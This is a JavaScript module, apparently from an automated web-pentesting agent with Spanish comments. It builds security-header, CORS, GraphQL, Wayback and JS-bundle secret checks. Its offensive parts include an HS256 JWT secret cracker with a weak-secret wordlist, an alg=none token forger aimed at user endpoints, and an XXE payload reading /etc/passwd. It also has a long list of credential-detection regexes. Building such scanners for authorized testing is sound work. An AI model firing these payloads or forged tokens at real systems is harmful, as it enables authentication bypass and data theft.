 * protección de clickjacking, CSP, y flags de cookies de sesión.
 */
export function securityHeaderFindings(headText, baseUrl) {
  const h = String(headText || "");
  if (!h.trim()) return [];
  const isHttps = /^https:/i.test(String(baseUrl || ""));
  const out = [];

  if (isHttps && !/strict-transport-security\s*:/i.test(h)) {
    out.push({
      title: "Falta Strict-Transport-Security (HSTS)",
      severity: "Low",
      description: "El servidor responde por HTTPS pero no envía Strict-Transport-Security (CWE-319): un downgrade a HTTP o un atacante en la red no se previene a nivel de navegador en visitas futuras.",
      remediation: "Añadir Strict-Transport-Security: max-age=31536000; includeSubDomains (y preload si aplica a toda la organización).",
    });
  }
  if (!/x-content-type-options\s*:\s*nosniff/i.test(h)) {
    out.push({
      title: "Falta X-Content-Type-Options: nosniff",
      severity: "Low",
      description: "Sin X-Content-Type-Options: nosniff (CWE-693), el navegador puede reinterpretar (MIME-sniff) una respuesta como un tipo distinto al declarado, ampliando el impacto de una subida de archivos maliciosa o una respuesta de API mal tipada.",
      remediation: "Añadir X-Content-Type-Options: nosniff en todas las respuestas.",
    });
  }
  const cspMatch = h.match(/content-security-policy\s*:\s*([^\r\n]+)/i);
  const hasFrameAncestors = cspMatch && /frame-ancestors/i.test(cspMatch[1]);
  const hasXfo = /x-frame-options\s*:/i.test(h);
  if (!hasXfo && !hasFrameAncestors) {
    out.push({
      title: "Sin protección contra clickjacking (falta X-Frame-Options / frame-ancestors)",
      severity: "Medium",
      description: "Ni X-Frame-Options ni una Content-Security-Policy con frame-ancestors están presentes (CWE-1021): el sitio puede embeberse en un <iframe> desde un dominio atacante para trucos de superposición de UI (clickjacking).",
      remediation: "Añadir Content-Security-Policy: frame-ancestors 'none' (o 'self') y/o X-Frame-Options: DENY/SAMEORIGIN.",
    });
  }
  if (!cspMatch) {
    out.push({
      title: "Falta Content-Security-Policy",
      severity: "Low",
      description: "No se envía cabecera Content-Security-Policy (CWE-693): sin esta defensa en profundidad, un XSS que sí logre colarse es mucho más fácil de explotar (carga de script externo, exfiltración de datos).",
      remediation: "Definir una CSP restrictiva (default-src 'self'; script-src explícito y sin unsafe-inline).",
    });
  }
  const seenCookieChecks = new Set();
  for (const m of h.matchAll(/set-cookie\s*:\s*([^\r\n]+)/gi)) {
    const c = m[1];
    const name = (c.split("=")[0] || "cookie").trim();
    // Un mismo Set-Cookie puede repetirse (redirects, sesión regenerada);
    // no duplicar el mismo hallazgo de flags para la misma cookie.
    if (seenCookieChecks.has(name)) continue;
    seenCookieChecks.add(name);
    const looksSensitive = /session|token|auth|sid\b|jwt|connect\.sid/i.test(name);
    if (isHttps && !/;\s*secure\b/i.test(c)) {
      out.push({
        title: `Cookie «${name}» sin flag Secure`,
        severity: "Medium",
        description: `La cookie ${name} se emite por HTTPS sin el flag Secure (CWE-614): el navegador la enviaría igual si el sitio se sirve alguna vez por HTTP plano (downgrade, proxy mal configurado, red hostil), exponiéndola en tránsito.`,
        remediation: "Marcar la cookie con Secure (y HttpOnly/SameSite si corresponde).",
      });
    }
    if (looksSensitive && !/;\s*httponly\b/i.test(c)) {
      out.push({
        title: `Cookie de sesión «${name}» sin flag HttpOnly`,
        severity: "High",
        description: `La cookie ${name} (aparenta ser de sesión/autenticación) no tiene HttpOnly (CWE-1004): cualquier XSS en el sitio puede leerla vía document.cookie y robar la sesión.`,
        remediation: "Marcar las cookies de sesión con HttpOnly.",
      });
    }
    if (!/;\s*samesite\s*=/i.test(c)) {
      out.push({
        title: `Cookie «${name}» sin atributo SameSite`,
        severity: "Low",
        description: `La cookie ${name} no define SameSite (CWE-352): se envía también en peticiones cross-site, ampliando la superficie de CSRF si no hay otra mitigación (token anti-CSRF).`,
        remediation: "Definir SameSite=Lax o Strict según el flujo de la aplicación.",
      });
    }
  }
  return out;
}

/** Origen no confiable usado para detectar reflejo CORS (no confundir con exploit). */
export const CORS_PROBE_ORIGIN = "https://ds-cors-probe.invalid";

/**
 * Clasifica una mala configuración CORS a partir de las cabeceras devueltas
 * al enviar CORS_PROBE_ORIGIN como Origin. Solo detección: no hace ninguna
 * petición cross-origin real ni exfiltra nada.
 * https://hacktricks.wiki/en/pentesting-web/cors-bypass.html
 */
export function corsFinding(blob) {
  const b = String(blob || "");
  const acaoMatch = b.match(/access-control-allow-origin:\s*([^\r\n]+)/i);
  if (!acaoMatch) return null;
  const acao = acaoMatch[1].trim();
  const hasCreds = /access-control-allow-credentials:\s*true/i.test(b);
  const hacktricks = HT + "cors-bypass.html";
  if (acao === "*" && hasCreds) {
    return {
      title: "CORS: Access-Control-Allow-Origin * junto con Allow-Credentials: true",
      severity: "High",
      hacktricks,
      description:
        "La respuesta combina un origen comodín (*) con Access-Control-Allow-Credentials: true. El navegador debería rechazar esa combinación, pero indica una implementación manual insegura (p. ej. reflejo condicional del Origin) que suele fallar en algún endpoint del mismo servicio.",
      remediation: "No combinar wildcard con credenciales; usar allow-list explícita de orígenes de confianza.",
    };
  }
  if (acao.includes(CORS_PROBE_ORIGIN)) {
    return {
      title: hasCreds
        ? "CORS: refleja cualquier Origin y permite credenciales (robo de sesión cross-origin)"
        : "CORS: refleja cualquier Origin sin validar contra allow-list",
      severity: hasCreds ? "Critical" : "High",
      hacktricks,
      description: `El servidor devolvió Access-Control-Allow-Origin: ${acao} en respuesta a un Origin de prueba no confiable (${CORS_PROBE_ORIGIN}): refleja el Origin recibido en vez de validarlo contra una lista blanca.${hasCreds ? " Además envía Allow-Credentials: true, permitiendo a cualquier sitio leer respuestas autenticadas de la víctima." : ""}`,
      remediation: "Validar el Origin contra una allow-list estricta en servidor; no reflejar el header recibido; nunca combinarlo con Allow-Credentials: true salvo orígenes explícitamente confiables.",
    };
  }
  return null;
}

/**
 * Señales genéricas (cualquier app, no solo DVWA).
 * Si aparecen en la salida de curl/whatweb/nikto, se clasifica la clase.
 */
export const SURFACE_SIGNALS = [
  {
    re: /You have an error in your SQL syntax|mysql_fetch|supplied argument is not a valid MySQL|pg_query\(|ORA-\d{5}|Unclosed quotation mark/i,
    title: "Errores SQL reflejados en la respuesta HTTP",
    severity: "High",
    description:
      "La aplicación devuelve errores de motor SQL al cliente. Es un indicador de superficie de inyección (CWE-89) y de fuga de esquema. Defensa: no mostrar errores de BD; consultas parametrizadas.",
    remediation: "Ocultar errores SQL; parametrizar; logs solo en servidor.",
  },
  {
    re: /PHP Version\s+\d+\.\d+/i,
    title: "Cuerpo phpinfo() en respuesta HTTP",
    severity: "High",
    description:
      "La respuesta incluye el volcado de phpinfo() (versión, módulos, rutas). Facilita reconocimiento; no es RCE por sí solo.",
    remediation: "Eliminar phpinfo.php y llamadas a phpinfo() fuera de lab.",
  },
  {
    re: /\$_DVWA|db_password|define\s*\(\s*['\"]MYSQL/i,
    title: "Secretos de aplicación en cuerpo HTTP",
    severity: "Critical",
    description:
      "El cuerpo HTTP contiene directivas de configuración o credenciales de BD. Fuga de secretos (CWE-538).",
    remediation: "Retirar el fichero del document root; rotar credenciales; denegar .inc/.bak/.env.",
  },
  {
    re: /allow_url_include\s*=\s*On/i,
    title: "allow_url_include habilitado",
    severity: "High",
    description:
      "php.ini (o phpinfo) muestra allow_url_include=On: habilita inclusión remota si hay LFI. Debe estar Off.",
    remediation: "allow_url_include=Off; open_basedir; no pasar paths de usuario a include.",
  },
  {
    re: /^TRACE\s+\/\S*\s+HTTP\/1\.[01]/im,
    title: "Método HTTP TRACE habilitado (posible Cross-Site Tracing)",
    severity: "Medium",
    // scopeKey: el heurístico prioriza la salida de p1-curl-trace-probe (su
    // propio paso) en vez del blob completo, para no confundir un eco real
    // de TRACE con esa misma línea apareciendo por casualidad en otra salida.
    scopeKey: "trace",
    description:
      "El servidor responde a una petición TRACE reflejando la petición completa en el cuerpo, incluidas cabeceras que el navegador normalmente oculta a JavaScript (p. ej. cookies HttpOnly). Combinado con XSS, permite robarlas (XST).",
    remediation: "Deshabilitar los métodos TRACE y TRACK en el servidor web; permitir solo los métodos HTTP necesarios.",
  },
];

function escapeRe(s) {
  return String(s).replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

export function modulePathRe(path) {
  return new RegExp(escapeRe(path), "i");
}

/** Pasos curl del playbook para módulos DVWA (fase 2 o 3). */
export function dvwaModuleCurlSteps(step, prefix, baseUrl, cookie, maxTime = "15") {
  return DVWA_MODULES.map((m) =>
    step(`${prefix}-${m.stepId}`, "curl", ["-s", "-L", "--max-time", maxTime, "-b", cookie, baseUrl + m.path], null, {
      desc: m.probeDesc,
    }),
  );
}

/** Pasos curl de sondas genéricas de exposición (cualquier stack, fase 1). */
export function genericExposureCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return GENERIC_EXPOSURE_PROBES.map((p) =>
    step(`${prefix}-${p.stepId}`, "curl", ["-s", "-L", "--max-time", maxTime, baseUrl + p.path], null, {
      desc: `Sonda de exposición: ${p.path}`,
    }),
  );
}

/* ------------------------------------------------------------------------ *
 * GraphQL — descubrimiento de endpoint + introspection. A diferencia de
 * GENERIC_EXPOSURE_PROBES (GET simple), GraphQL no responde nada útil a un
 * GET: hace falta POST con Content-Type JSON y una query real. La query de
 * introspección ({__schema{...}}) es estándar del protocolo (no un
 * exploit); si el servidor la contesta con el schema completo, es
 * exposición de superficie de API completa sin autenticar (CWE-200).
 * ------------------------------------------------------------------------ */
export const GRAPHQL_PROBES = [
  { stepId: "graphql", path: "/graphql" },
  { stepId: "api-graphql", path: "/api/graphql" },
  { stepId: "graphiql", path: "/graphiql" },
  { stepId: "v1-graphql", path: "/v1/graphql" },
  { stepId: "query", path: "/query" },
];

const GRAPHQL_INTROSPECTION_BODY = JSON.stringify({ query: "{__schema{queryType{name}}}" });

export function graphqlIntrospectionCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return GRAPHQL_PROBES.map((p) =>
    step(`${prefix}-${p.stepId}`, "curl", [
      "-s", "-L", "--max-time", maxTime,
      "-X", "POST", "-H", "Content-Type: application/json",
      "-d", GRAPHQL_INTROSPECTION_BODY,
      baseUrl + p.path,
    ], null, {
      desc: `Sonda GraphQL: introspection en ${p.path}`,
    }),
  );
}

// Envolvente estándar de respuesta GraphQL (data/errors) — confirma que el
// endpoint es GraphQL de verdad, no un 404 genérico o un JSON cualquiera.
const GRAPHQL_ENDPOINT_RE = /"data"\s*:\s*[{[]|"errors"\s*:\s*\[/i;
const GRAPHQL_SCHEMA_RE = /"__schema"|"queryType"\s*:\s*\{/i;

export function graphqlFindings(text, path) {
  const t = String(text || "");
  if (!GRAPHQL_ENDPOINT_RE.test(t)) return [];
  if (GRAPHQL_SCHEMA_RE.test(t)) {
    return [{
      title: `GraphQL introspection habilitada en ${path}`,
      severity: "Medium",
      description: `El endpoint GraphQL en ${path} respondió a una query de introspección (__schema) exponiendo el esquema completo: tipos, queries, mutations y sus argumentos (CWE-200). Cualquiera puede mapear toda la superficie de la API sin credenciales, incluidas mutations no documentadas — inventario directo para IDOR/lógica de negocio.`,
      remediation: "Deshabilitar introspection en producción (introspection: false en Apollo Server, GRAPHIQL=false en la mayoría de frameworks). Si hace falta para debugging, restringirlo a IPs internas o requerir autenticación.",
    }];
  }
  return [{
    title: `Endpoint GraphQL detectado en ${path} (introspection deshabilitada)`,
    severity: "Info",
    description: `${path} responde con el formato estándar de GraphQL (data/errors) pero rechazó la query de introspección: la API existe pero el esquema no es explorable a ciegas. Candidato a sondear manualmente operaciones conocidas por nombre (login, user, admin, createUser).`,
    remediation: "Ninguna por sí sola: buena práctica ya aplicada (introspection cerrada). Confirmar que tampoco haya un endpoint /graphiql o playground accesible en producción.",
  }];
}

/* ------------------------------------------------------------------------ *
 * JWT: crackeo offline de secreto débil (HS256) y bypass alg=none.
 * Solo cómputo local (SHA-256/HMAC puro JS, sin llamada de red para el
 * crackeo) + una petición HTTP activa por endpoint para probar el bypass,
 * misma clase de riesgo que las sondas de SQLi/NoSQLi login ya existentes.
 * https://hacktricks.wiki/en/pentesting-web/hacking-jwt-json-web-tokens.html
 * ------------------------------------------------------------------------ */

function rotr(x, n) {
  return (x >>> n) | (x << (32 - n));
}

const SHA256_K = [
  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
  0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
  0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
  0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
  0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
  0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
];

/** SHA-256 puro JS (sin dependencias): agente corre en navegador, no Node. */
function sha256(bytes) {
  const l = bytes.length;
  const withPad = new Uint8Array((((l + 8) >> 6) << 6) + 64);
  withPad.set(bytes);
  withPad[l] = 0x80;
  const bitLen = l * 8;
  const dv = new DataView(withPad.buffer);
  dv.setUint32(withPad.length - 4, bitLen >>> 0, false);
  dv.setUint32(withPad.length - 8, Math.floor(bitLen / 0x100000000), false);

  let h0 = 0x6a09e667, h1 = 0xbb67ae85, h2 = 0x3c6ef372, h3 = 0xa54ff53a;
  let h4 = 0x510e527f, h5 = 0x9b05688c, h6 = 0x1f83d9ab, h7 = 0x5be0cd19;
  const w = new Uint32Array(64);

  for (let offset = 0; offset < withPad.length; offset += 64) {
    for (let i = 0; i < 16; i++) w[i] = dv.getUint32(offset + i * 4, false);
    for (let i = 16; i < 64; i++) {
      const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >>> 3);
      const s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >>> 10);
      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) | 0;
    }
    let a = h0, b = h1, c = h2, d = h3, e = h4, f = h5, g = h6, h = h7;
    for (let i = 0; i < 64; i++) {
      const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
      const ch = (e & f) ^ (~e & g);
      const temp1 = (h + S1 + ch + SHA256_K[i] + w[i]) | 0;
      const S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
      const maj = (a & b) ^ (a & c) ^ (b & c);
      const temp2 = (S0 + maj) | 0;
      h = g; g = f; f = e; e = (d + temp1) | 0;
      d = c; c = b; b = a; a = (temp2 + temp1) | 0;
    }
    h0 = (h0 + a) | 0; h1 = (h1 + b) | 0; h2 = (h2 + c) | 0; h3 = (h3 + d) | 0;
    h4 = (h4 + e) | 0; h5 = (h5 + f) | 0; h6 = (h6 + g) | 0; h7 = (h7 + h) | 0;
  }
  const out = new Uint8Array(32);
  const odv = new DataView(out.buffer);
  [h0, h1, h2, h3, h4, h5, h6, h7].forEach((v, i) => odv.setUint32(i * 4, v >>> 0, false));
  return out;
}

function concatBytes(a, b) {
  const out = new Uint8Array(a.length + b.length);
  out.set(a, 0);
  out.set(b, a.length);
  return out;
}

function hmacSha256(keyBytes, msgBytes) {
  const blockSize = 64;
  let key = keyBytes.length > blockSize ? sha256(keyBytes) : keyBytes;
  if (key.length < blockSize) {
    const k = new Uint8Array(blockSize);
    k.set(key);
    key = k;
  }
  const oKeyPad = new Uint8Array(blockSize);
  const iKeyPad = new Uint8Array(blockSize);
  for (let i = 0; i < blockSize; i++) {
    oKeyPad[i] = key[i] ^ 0x5c;
    iKeyPad[i] = key[i] ^ 0x36;
  }
  return sha256(concatBytes(oKeyPad, sha256(concatBytes(iKeyPad, msgBytes))));
}

function base64UrlToBytes(b64url) {
  const b64 = String(b64url || "").replace(/-/g, "+").replace(/_/g, "/");
  const pad = b64.length % 4 === 0 ? "" : "=".repeat(4 - (b64.length % 4));
  const bin = atob(b64 + pad);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}

function bytesToBase64Url(bytes) {
  let bin = "";
  for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
  return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

/** Coincidencia de longitud fija primero: evita comparar arrays desiguales. */
function bytesEqual(a, b) {
  if (a.length !== b.length) return false;
  for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) return false;
  return true;
}

/** Cualquier JWT en texto de respuesta (login, /whoami, etc.). */
export const JWT_TOKEN_RE = /eyJ[\w-]+\.[\w-]+\.[\w-]+/;

/**
 * Diccionario curado de secretos HS256 habituales (defaults de librería,
 * ejemplos de documentación, nombres de app genéricos) — no un dump de
 * contraseñas filtradas. Igual de curado que HYDRA_USERLIST/PASSLIST.
 */
export const JWT_WEAK_SECRETS = [
  "secret", "Secret", "SECRET", "secretkey", "secret_key", "your-256-bit-secret",
  "changeme", "change-me", "password", "123456", "12345678", "admin", "administrator",
  "jwtsecret", "jwt_secret", "JWT_SECRET", "jwt-secret", "supersecret", "super-secret",
  "super_secret_key", "mysecretkey", "my-secret-key", "topsecret", "top-secret",
  "shhhhh", "shh", "dev", "development", "test", "testsecret", "default", "defaultsecret",
  "key", "qwerty", "letmein", "express-secret", "nodejs-secret", "s3cr3t", "keyboardcat",
  "verysecretkey", "0000000000000000", "1111111111111111", "",
];

/**
 * Intenta romper el secreto HS256 de un JWT contra un diccionario curado
 * (cómputo local, sin red). Solo aplica a alg=HS256; RS/ES256 no son
 * crackeables así (clave asimétrica). Devuelve el secreto si acierta.
 */
export function crackJwtHs256Secret(token, wordlist = JWT_WEAK_SECRETS) {
  const parts = String(token || "").split(".");
  if (parts.length !== 3) return null;
  const [headerB64, payloadB64, sigB64] = parts;
  let header;
  try {
    header = JSON.parse(new TextDecoder().decode(base64UrlToBytes(headerB64)));
  } catch {
    return null;
  }
  if (!/^HS256$/i.test(String(header.alg || ""))) return null;
  let targetSig;
  try {
    targetSig = base64UrlToBytes(sigB64);
  } catch {
    return null;
  }
  const signingInput = new TextEncoder().encode(`${headerB64}.${payloadB64}`);
  for (const secret of wordlist) {
    const mac = hmacSha256(new TextEncoder().encode(secret), signingInput);
    if (bytesEqual(mac, targetSig)) return secret;
  }
  return null;
}

/**
 * Reforja un JWT capturado con header {"alg":"none"} y firma vacía —
 * bypass clásico cuando el backend no verifica alg antes de confiar en el
 * token. Mantiene el payload original (mismos claims/rol) tal cual.
 */
export function forgeAlgNoneToken(token) {
  const parts = String(token || "").split(".");
  if (parts.length !== 3) return null;
  const [, payloadB64] = parts;
  const forgedHeader = bytesToBase64Url(new TextEncoder().encode(JSON.stringify({ alg: "none", typ: "JWT" })));
  return `${forgedHeader}.${payloadB64}.`;
}

/**
 * Endpoints típicamente autenticados donde probar el token alg=none forjado.
 * Se prefieren rutas de colección REST (Sequelize/Express-style) que con
 * middleware de auth estándar responden 401 limpio sin token — así el
 * heurístico (2xx en vez de 401/403) es una señal fiable. Confirmado en
 * vivo contra Juice Shop: /api/Users/ da 401 sin token, y con el JWT
 * original o con el forjado alg=none devuelve el mismo dump completo de
 * usuarios — bypass real, no falso positivo por un endpoint que ya
 * responde 200 sin sesión (ese fue el caso descartado de /rest/user/whoami).
 */
export const JWT_ALGNONE_PROBE_PATHS = [
  "/api/Users/",
  "/api/users",
];

/** Pasos curl con el JWT alg=none forjado contra endpoints autenticados. */
export function jwtAlgNoneCurlSteps(step, prefix, baseUrl, forgedToken, maxTime = "12") {
  if (!forgedToken) return [];
  return JWT_ALGNONE_PROBE_PATHS.map((path, i) =>
    step(`${prefix}-${i + 1}`, "curl", [
      "-s", "-L", "--max-time", maxTime,
      "-H", `Authorization: Bearer ${forgedToken}`,
      "-w", "\nDS_HTTP:%{http_code}\n",
      baseUrl + path,
    ], null, {
      desc: `JWT alg=none forjado contra ${path}`,
    }),
  );
}

/* ------------------------------------------------------------------------ *
 * OSINT pasivo: Wayback Machine (archive.org) — rutas/endpoints viejos que
 * el sitio ya no enlaza pero siguen indexados históricamente. Solo lectura
 * contra un servicio de terceros, sin tocar el target.
 * https://hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html
 * ------------------------------------------------------------------------ */
export function waybackOsintSteps(step, root) {
  if (!root || !root.includes(".")) return [];
  return [
    // matchType=domain es la forma eficiente de pedir "este dominio y sus
    // subdominios" al CDX API; el patrón *.dominio/* con wildcard en el
    // propio url= es más lento y a veces el servicio tarda >20s en
    // responder (servicio de terceros, fuera de nuestro control).
    step("p1-osint-wayback-cdx", "curl", [
      "-s", "--max-time", "30",
      `https://web.archive.org/cdx/search/cdx?url=${root}&matchType=domain&output=text&fl=original&collapse=urlkey&limit=200`,
    ], null, {
      desc: "Rutas históricas indexadas por Wayback Machine (archive.org)",
    }),
  ];
}

/* ------------------------------------------------------------------------ *
 * XXE (XML External Entity) genérico: mismo criterio que SSTI — un solo
 * payload curado, confirmación solo si el efecto real ocurrió (aquí,
 * lectura de fichero local), no un eco ciego del payload sin evaluar.
 * Rutas típicas que aceptan XML: SOAP, APIs REST que también aceptan
 * application/xml además de JSON, endpoints de importación/upload.
 * https://hacktricks.wiki/en/pentesting-web/xxe-xml-external-entity.html
 * ------------------------------------------------------------------------ */
export const XXE_PAYLOAD =
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
export const XXE_PATHS = [
  "/", "/api", "/api/xml", "/soap", "/xmlrpc.php", "/upload", "/import",
];

const XXE_CONFIRMED_RE = /root:.*:0:0:/;

/** true si la respuesta refleja /etc/passwd real (lectura de fichero confirmada, no eco ciego). */
export function xxeConfirmed(text) {
  return XXE_CONFIRMED_RE.test(String(text || ""));
}

export function xxeCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return XXE_PATHS.map((path, i) =>
    step(`${prefix}-${i + 1}`, "curl", [
      "-s", "-L", "--max-time", maxTime,
      "-H", "Content-Type: application/xml",
      "--data-binary", XXE_PAYLOAD,
      baseUrl + path,
    ], null, {
      desc: `Sonda de XXE genérico: ${path}`,
    }),
  );
}

/* ------------------------------------------------------------------------ *
 * Código fuente: secretos hardcodeados en bundles JS ya servidos por la
 * app (SPA React/Vue/Angular). Puramente pasivo: solo analiza texto de
 * ficheros que la propia app expone públicamente.
 * ------------------------------------------------------------------------ */
export const JS_BUNDLE_PROBE_PATHS = [
  "/main.js", "/bundle.js", "/app.js",
  "/static/js/main.js", "/assets/index.js", "/dist/main.js",
];

export function jsBundleCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return JS_BUNDLE_PROBE_PATHS.map((path, i) =>
    step(`${prefix}-${i + 1}`, "curl", [
      "-s", "-L", "--max-time", maxTime, "-w", "\nDS_HTTP:%{http_code}\n", baseUrl + path,
    ], null, {
      desc: `Bundle JS ${path} — buscar secretos hardcodeados`,
    }),
  );
}

const JS_SECRET_SIGNATURES = [
  { label: "AWS Access Key ID", re: /\b(AKIA|ASIA)[0-9A-Z]{16}\b/, cwe: "CWE-798", severity: "Critical", validator: null },
  { label: "AWS Secret Access Key", re: /aws(.{0,20})?(secret|access)?[_-]?key['"]?\s*[:=]\s*['"][0-9a-zA-Z/+]{40}['"]/i, cwe: "CWE-798", severity: "Critical" },
  { label: "Google API Key", re: /\bAIza[0-9A-Za-z\-_]{35}\b/, cwe: "CWE-798", severity: "High" },
  { label: "Google/GCP Service Account JSON", re: /"type":\s*"service_account"/i, cwe: "CWE-798", severity: "Critical" },
  { label: "GCP OAuth client secret", re: /\bGOCSPX-[A-Za-z0-9_\-]{28}\b/, cwe: "CWE-798", severity: "High" },
  { label: "Google OAuth access token", re: /\bya29\.[0-9A-Za-z_\-]{20,}\b/, cwe: "CWE-798", severity: "High" },
  { label: "Stripe Secret Key (live)", re: /\bsk_live_[0-9a-zA-Z]{24,}\b/, cwe: "CWE-798", severity: "Critical", validator: "stripe" },
  { label: "Stripe Restricted Key (live)", re: /\brk_live_[0-9a-zA-Z]{24,}\b/, cwe: "CWE-798", severity: "High", validator: "stripe" },
  { label: "Stripe Secret Key (test)", re: /\bsk_test_[0-9a-zA-Z]{24,}\b/, cwe: "CWE-798", severity: "Low" },
  { label: "Slack Token", re: /\bxox[abpors]-[0-9A-Za-z\-]{10,48}\b/, cwe: "CWE-798", severity: "High", validator: "slack" },
  { label: "Slack App-level Token", re: /\bxapp-1-[A-Za-z0-9\-]{20,}\b/, cwe: "CWE-798", severity: "High", validator: "slack" },
  { label: "Slack Webhook URL", re: /https:\/\/hooks\.slack\.com\/services\/T[A-Z0-9]+\/B[A-Z0-9]+\/[A-Za-z0-9]+/, cwe: "CWE-798", severity: "Medium" },
  { label: "GitHub Personal Access Token", re: /\bgh[pousr]_[A-Za-z0-9]{36}\b/, cwe: "CWE-798", severity: "Critical", validator: "github" },
  { label: "GitHub Fine-Grained Token", re: /\bgithub_pat_[A-Za-z0-9_]{82}\b/, cwe: "CWE-798", severity: "Critical", validator: "github" },
  { label: "GitHub App/installation token", re: /\bgh[usr]_[A-Za-z0-9]{36,}\b/, cwe: "CWE-798", severity: "High", validator: "github" },
  { label: "GitLab Personal Access Token", re: /\bglpat-[A-Za-z0-9_\-]{20}\b/, cwe: "CWE-798", severity: "High", validator: "gitlab" },
  { label: "Clave privada embebida", re: /-----BEGIN (RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----/, cwe: "CWE-321", severity: "Critical" },
  { label: "Twilio Account SID", re: /\bAC[a-f0-9]{32}\b/, cwe: "CWE-798", severity: "Medium" },
  { label: "Twilio API Key SID", re: /\bSK[0-9a-fA-F]{32}\b/, cwe: "CWE-798", severity: "High" },
  { label: "SendGrid API Key", re: /\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b/, cwe: "CWE-798", severity: "High", validator: "sendgrid" },
  { label: "Mailgun API Key", re: /(?:mailgun|api[_-]?key)['"\s:=]{1,16}(key-[0-9a-zA-Z]{32})\b/i, cwe: "CWE-798", severity: "High" },
  { label: "Mailchimp API Key", re: /\b[0-9a-f]{32}-us[0-9]{1,2}\b/, cwe: "CWE-798", severity: "High" },
  { label: "Heroku API Key", re: /heroku(.{0,20})?api['"\s:=]+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})/i, cwe: "CWE-798", severity: "Medium" },
  { label: "npm Access Token", re: /\bnpm_[A-Za-z0-9]{36}\b/, cwe: "CWE-798", severity: "High", validator: "npm" },
  { label: "PyPI API Token", re: /\bpypi-AgEN[A-Za-z0-9_\-]{20,}\b/, cwe: "CWE-798", severity: "High" },
  { label: "RubyGems API Key", re: /\brubygems_[a-f0-9]{48}\b/, cwe: "CWE-798", severity: "High" },
  { label: "Docker Hub PAT", re: /\bdckr_pat_[A-Za-z0-9_\-]{27,}\b/, cwe: "CWE-798", severity: "High" },
  { label: "Discord Webhook URL", re: /discord(?:app)?\.com\/api\/webhooks\/\d{17,20}\/[0-9A-Za-z_-]{60,}/, cwe: "CWE-798", severity: "High" },
  { label: "Firebase Cloud Messaging/Server Key", re: /\bAAAA[A-Za-z0-9_\-]{7}:[A-Za-z0-9_\-]{140,}\b/, cwe: "CWE-798", severity: "High" },
  { label: "DigitalOcean Personal Access Token", re: /\bdop_v1_[a-f0-9]{64}\b/, cwe: "CWE-798", severity: "High", validator: "digitalocean" },
  { label: "Shopify Access Token", re: /\bshp(?:at|ca|pa|ss)_[a-fA-F0-9]{32}\b/, cwe: "CWE-798", severity: "High" },
  { label: "JSON Web Token con secreto en URL", re: /[?&](?:token|jwt|access_token)=eyJ[0-9A-Za-z_-]{10,}\.[0-9A-Za-z_-]{10,}\.[0-9A-Za-z_-]{10,}/, cwe: "CWE-598", severity: "High" },
  { label: "Anthropic API Key", re: /\bsk-ant-(?:api03|admin01)-[A-Za-z0-9_\-]{93,}\b/, cwe: "CWE-798", severity: "Critical" },
  { label: "OpenAI API Key (legacy)", re: /\bsk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}\b/, cwe: "CWE-798", severity: "Critical" },
  { label: "OpenAI Project API Key", re: /\bsk-proj-[A-Za-z0-9_\-]{40,}T3BlbkFJ[A-Za-z0-9_\-]{40,}\b/, cwe: "CWE-798", severity: "Critical" },
  { label: "OpenAI Session Key", re: /\bsess-[A-Za-z0-9]{40}\b/, cwe: "CWE-798", severity: "High" },
  { label: "Hugging Face Token", re: /\bhf_[A-Za-z0-9]{30,}\b/, cwe: "CWE-798", severity: "High", validator: "huggingface" },
  { label: "Cloudflare API Token", re: /(?:cloudflare|x-auth-key)['"\s:=]{1,20}([A-Za-z0-9_\-]{40})\b/i, cwe: "CWE-798", severity: "High" },
  { label: "Cloudflare Global API Key", re: /cf[_-]?api[_-]?key['"\s:=]+([a-f0-9]{37})/i, cwe: "CWE-798", severity: "Critical" },
  { label: "Postman API Key", re: /\bPMAK-[A-Za-z0-9]{24,64}\b/, cwe: "CWE-798", severity: "Critical" },
  { label: "Square Access Token", re: /\bsq0atp-[0-9A-Za-z\-_]{22}\b/, cwe: "CWE-798", severity: "Critical", validator: "square" },
